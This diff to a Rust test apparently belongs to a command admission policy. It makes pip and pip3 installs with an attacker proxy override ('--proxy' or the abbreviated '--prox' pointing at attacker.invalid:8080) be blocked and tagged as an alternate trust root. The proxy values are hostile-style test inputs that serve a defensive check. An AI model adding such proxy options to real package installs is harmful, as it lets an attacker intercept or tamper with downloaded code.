@@ -26,25 +26,28 @@ fn approved_pip_install_without_proxy_override_remains_allowed() {
 #[test]
 fn pip_proxy_override_cannot_inherit_artifact_approval() {
     for executable in ["pip", "pip3"] {
-        let (policy, mut intent) = approved_pip_install(executable);
-        intent
-            .argv
-            .push("--proxy=http://attacker.invalid:8080".to_string());
+        for proxy_option in [
+            "--proxy=http://attacker.invalid:8080",
+            "--prox=http://attacker.invalid:8080",
+        ] {
+            let (policy, mut intent) = approved_pip_install(executable);
+            intent.argv.push(proxy_option.to_string());
 
-        let decision = admission_decision(&policy, &intent);
+            let decision = admission_decision(&policy, &intent);
 
-        assert_eq!(
-            decision.decision,
-            DecisionKind::Block,
-            "{executable} must not let an approved artifact authorize a caller-selected proxy"
-        );
-        assert!(
-            decision
-                .reason_codes
-                .contains(&ReasonCode::AlternateTrustRoot),
-            "attached proxy routing authority must be classified explicitly: {:?}",
-            decision.reason_codes
-        );
+            assert_eq!(
+                decision.decision,
+                DecisionKind::Block,
+                "{executable} must not let accepted proxy selector {proxy_option:?} inherit approved artifact authority"
+            );
+            assert!(
+                decision
+                    .reason_codes
+                    .contains(&ReasonCode::AlternateTrustRoot),
+                "proxy routing authority {proxy_option:?} must be classified explicitly: {:?}",
+                decision.reason_codes
+            );
+        }
     }
 }
 
